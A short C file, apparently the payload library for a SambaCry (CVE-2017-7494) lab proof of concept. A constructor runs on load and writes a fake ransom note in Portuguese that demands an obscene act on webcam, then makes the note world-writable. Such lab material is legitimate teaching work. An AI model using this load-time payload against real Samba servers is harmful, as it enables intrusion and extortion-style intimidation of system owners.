#include <stdio.h>
#include <stdlib.h>

void __attribute__((constructor)) poc_exploit() {
    FILE *f = fopen("/home/sambacry/LEIA_ME_SEUS_FICHEIROS_FORAM_CIFRADOS.txt", "w");
    if (f == NULL) {       
        return;
    }
    
    fprintf(f, "------------------------------------\n");
    fprintf(f, "OLA, O SEU SISTEMA FOI COMPROMETIDO!\n\n");
    fprintf(f, "Isto é uma prova de conceito para o lab HackInSDN.\n");
    fprintf(f, "O seu serviço Samba estava vulnerável ao CVE-2017-7494, coma merda na frente da webcam imediatamente para recuperar seus arquivos.\n");
    fprintf(f, "------------------------------------\n");
    fclose(f);
    
    system("chmod 777 /home/sambacry/LEIA_ME_SEUS_FICHEIROS_FORAM_CIFRADOS.txt");
}